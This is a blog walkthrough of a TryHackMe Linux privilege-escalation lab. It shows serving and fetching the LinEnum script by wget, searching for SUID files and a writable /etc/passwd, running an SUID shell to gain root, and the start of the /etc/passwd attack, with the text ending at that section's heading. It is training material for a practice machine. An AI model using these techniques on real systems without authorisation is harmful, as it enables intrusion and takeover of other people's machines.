---
title: Common Linux PrivEsc detailed write-up | TryHackMe
published: true
---
Tasks <p class="highlight">1</p>, <p class="highlight">2</p> and <p class="highlight">3</p> don't need explanation.

## Task 4 : Enumeration

To get LinEnum on the target's machine, you need to start a server on your local machine (it has to be in the directory where you store LinEnum.sh or you will have to provide the path to it afterwards) and connect to it from the target :

<img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/python%20listener%20server4.png" class="border" />
 
```
python3 -m http.server 8000
```

>The `-m` option is used to search a module and run the corresponding python script, which in this case is an http server.
>The number 8000 is the port that our server will be listening in, you can select any port that's not being used.

Once the server is started, you can request the file you want from the target's console :

<img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/wget%20linenum4.png" class="border" />

```
wget <YOUR MACHINE'S @IP>:8000/LinEnum.sh
```

>`wget` is a network downloader
>By using this command, we are downloading the file `LinEnum.sh` from the server in <YOUR MACHINE'S @IP> that we started before.


Now that LinEnum.sh is on the target's machine, we need to make it executable (because we need to run it in order to start the enumeration process), this is done by using :

```
chmod +x LinEnum.sh
```

To see how Linux file permissions work, you can visit [this page](https://www.redhat.com/sysadmin/manage-permissions) 

Let's now look at how many "user[x]" are there in the system :

<img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/grep%20user4.png" class="border" />

```
cat /etc/passwd | grep user*
```
>What we are doing with `cat` is showing in stdout (Standard Output) the contents of the file `/etc/passwd` and piping them into a `grep` command.
>
>`grep` allows us to look for patterns in texts, by typing `grep user*` we are searching for any pattern that contains the word "user" and any other character next to it (this is why we use the wildcard *)

* * *
<p class="answer">Answer : there are 8 user[x] in the system.</p>
* * *
For a beteter understanding of wildcards in Linux, you can visit [this page](https://geek-university.com/linux/wildcard/) 

The next step is to find how many shells are there on the system, to guess so, we need to start enumerating with `LinEnum.sh`.
You can run the script with :

```
./LinEnum.sh
```
>Remember that you have previously dowloaded it, given the proper permissions and you are working in the directory where it is located.

A better way of keeping our enumeration clean and easily manageable is to write the output of `LinEnum.sh` to a `.txt` file :

```
./LinEnum.sh > LinEnum.txt
```

> The file can be named as what you want, but I recommend using a name such as "LinEnum" or "Enumeration".

Once we have run the script, we can look for how many shells there are on the system :

<img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/grep%20shell4.png" class="border" />

```
cat linEnum.txt | grep shell
```

* * *
<p class="answer">Answer : There are 4 shells in the system</p>
* * *

We are now asked what is the name of the bash script that is set to run every 5 minutes by cron.
Cron is used to automate tasks in Linux, its syntax can be a little bit tricky so if you need some more info you can have a look at [this site](https://linuxhandbook.com/crontab/)

Cron jobs are displayed in each user's /etc/crontab file, but since we run `LinEnum.sh` to do the work for us, we can just look for it at its output :

<img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/grep%20crontab%204.png" class="border" />

```
cat linEnum.txt | grep crontab -C 10
```

>If you have read the previous tasks, you already know what this is doing, the only novelty is the `-C` option, which specifies how many lines of context you want to display.

* * *
<p class="answer">Answer : The autoscript.sh file is located in the "/home/user4/Desktop" directory</p>
* * *

Finally, we want to search for a file that has had its permissions changed, and now users are allowed to write to it :

<img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/etc%20passwd%20perms4.png" class="border" />

```
find / -perm -200 2>/dev/null
ls -l /etc/passwd
```

>With the `find` command, we can look for files with concrete permissions by using the option `-perm`, to find files with user writing permissions we can look for `-200`, which shows every file which permissions are set to 200 or more.
>
>With `2>/dev/null`, we redirect the stderr (Standard Error) to /dev/null, which is kind of a "black hole" that discards all the data that is writen to it.
>
>For more info on stderr, visit [this page](https://www.howtogeek.com/435903/what-are-stdin-stdout-and-stderr-on-linux/). For more info on /dev/null, check [here](https://en.wikipedia.org/wiki/Null_device).
>
>A lot of files will be shown, but since /etc/passwd is such an important file, we can check its permissions with `ls -l` and see that it can be writen to.


## Task 5 : Abusing SUID/SGID Files

Checking for files with the `SUID/SGID` bit set is the go-to when first getting a shell on a machine if what we want is to escalata privileges.

If the `SUID` bit is set on a file, it means that the file will be executed with the same permissions as the owner of the file.
If the `SGID` bit is set on a file, the file will be executed with the permissions of the group that owns the file.
<p class="highlight">Important : SUID and SGID have different behaviour when they are set in directories</p>

In order to find files with the SUID bit set, we can have a look at our `LinEnum` scan, or we can search them manually :

<img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/find%20suid%20files5.png" class="border" />

```
find / -perm -u=s -type f 2>/dev/null
```
>Again, we are using `find` with its `-perm` option, this time we specify that we want any of the permission bits set (`-u=s`) and we use `-type f` so that it only returns files.

It seems that there is an uncommon file with the SUID bit set : 

* * *
<p class="answer">Answer : /home/user3/shell</p>
* * *

Due to `shell` having the SUID set, we can execute it and gain superuser privileges on the machine :

<img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/root5.png" class="border" />

```
ls -l /home/user3/shell
./shell
```
>To check if a file has the `SUID/SGID` bit set, we look at its permissions.
>
>If they are : `rws-rwx-rwx`, the `SUID` bit is set.
>
>If they are : `rwx-rws-rwx`, the `SGID` bit is set.
>
><p class="highlight"> Notice that they are marked with the character "s".</p>

## Task 6 : Exploiting writeable /etc/passwd

The `/etc/passwd` file stores valuable account information, <p class="highlight">it doesn't contain passwords</p>, it contains a list of the accounts of the system and it provides information about each and every of them, such as user ID, group ID, home directory, etc.
This file needs to have read permissions because other utilities require them to properly work, however it must not have write permissions except for the root account.
When a user can write in the /etc/passwd file, it can lead to a security breach, which is what we are going to exploit right about now :

What direction privilege escalation is the attack?

<p class="highlight">Horizontal privilege escalation</p> Occurs when we take over a user who is on the same privilege level as us.

<p class="highlight">Vertical privilege escalation</p> Takes place when we want to access an account which privileges are higher than ours.

* * *
<p class="answer"> Answer : Vertical</p>
* * *

The way to exploit the vulnerability that we have found (which is that /etc/passwd can be writen to by a non-superuser account) is adding a new line of text to /etc/passwd with the intention of creating a new account in the system, with the password that we decide, and superuser privileges.

**How is the /etc/passwd structured?**

<style>
  .border {   
  border-width: 0px;
  border-color: #7FFF00;
  border-style: groove;
  box-shadow: 0px 0px 8px #ADFF2F} 
 .answer {
 text-shadow : 0px 0px 4px #ADFF2F }
 .highlight {
 text-shadow : 0px 0px 4px #ff6699 }
</style>
